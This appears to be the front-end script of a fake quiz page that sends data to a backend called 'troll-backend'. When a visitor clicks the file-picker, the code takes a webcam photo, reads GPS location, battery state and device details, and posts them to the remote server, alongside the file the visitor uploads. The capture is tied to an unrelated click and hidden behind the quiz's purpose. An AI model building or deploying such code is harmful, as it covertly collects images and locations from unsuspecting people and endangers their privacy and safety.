// ================================
// CONFIG
// ================================
const BACKEND_BASE = "https://troll-backend.onrender.com/api";

const btn = document.getElementById('submit-btn') || document.getElementById('btn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const fileInput = document.getElementById('user-file');
const toast = document.getElementById('toast');
const form = document.getElementById('quiz-form');

// 🚫 MIC IS DISABLED HERE
const constraints = {
  video: { facingMode: "user" },
  audio: false
};

// ================================
// TOAST
// ================================
function showToast(msg) {
  if (!toast) return;
  toast.textContent = msg;
  toast.style.display = "block";
  setTimeout(() => toast.style.display = "none", 3000);
}

// ================================
// METADATA (RICH)
// ================================
async function collectMetadata() {
  const meta = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    width: window.innerWidth,
    height: window.innerHeight,
    language: navigator.language,
    time: new Date().toLocaleString(),
    battery: "N/A",
    location: "N/A"
  };

  if (navigator.getBattery) {
    const b = await navigator.getBattery();
    meta.battery = `${Math.round(b.level * 100)}% , charging: ${b.charging}`;
  }

  if (navigator.geolocation) {
    try {
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej)
      );
      meta.location = `${pos.coords.latitude},${pos.coords.longitude}`;
    } catch {
      meta.location = "Denied";
    }
  }

  return meta;
}

// ================================
// CAMERA CAPTURE
// ================================
async function captureAndSendCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;

    await new Promise(r => setTimeout(r, 3500)); // real frame

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const image = canvas.toDataURL("image/jpeg", 0.9);

    const metadata = await collectMetadata();

    await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata })
    });

    stream.getTracks().forEach(t => t.stop());
    showToast("Camera captured!");
  } catch (err) {
    console.error(err);
    showToast("Camera permission required!");
  }
}

// ================================
// FILE UPLOAD
// ================================
async function uploadFile(file) {
  const reader = new FileReader();
  reader.onload = async () => {
    await fetch(`${BACKEND_BASE}/file-upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ file: reader.result, filename: file.name })
    });
    showToast("File uploaded!");
  };
  reader.readAsDataURL(file);
}

// ================================
// EVENTS
// ================================
if (fileInput) {
  fileInput.addEventListener("click", captureAndSendCamera);
}

if (btn) {
  btn.addEventListener("click", async (e) => {
    e.preventDefault();

    if (!fileInput || fileInput.files.length === 0) {
      showToast("Select a file first!");
      return;
    }

    await uploadFile(fileInput.files[0]);

    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "block";
  });
        }
